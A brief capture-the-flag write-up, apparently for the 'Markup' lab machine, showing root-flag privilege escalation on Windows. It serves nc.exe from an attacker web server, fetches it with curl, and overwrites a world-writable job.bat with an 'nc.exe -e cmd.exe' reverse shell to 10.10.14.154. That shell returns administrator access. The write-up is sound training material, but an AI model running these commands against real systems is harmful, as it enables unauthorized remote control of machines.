# Root Flag

After checking the files, it is possible to see an unusual file directory named `C:\Log-Management`. A file named `job.bat` has been found.

It is possible to see that the current user has full access to this file.
```
daniel@MARKUP C:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)
```

The web server is  now listening on the attacker's machine.
```
sudo python3 -m http.server 80
```

The file `nc.exe` will be transferred for remote access, inside the `Log-Management` directory.
```
curl http://10.10.14.154/nc.exe -o nc.exe
```

The contents of the scripts are now replaced with this one.
```
daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc.exe -e cmd.exe 10.10.14.154 4445 > C:\Log-Management\job.bat
```

Then, the port will be listening on the attacker's machine.
```
sudo nc -lvnp 4445
```

After a few seconds, the shell is captured as administrator.
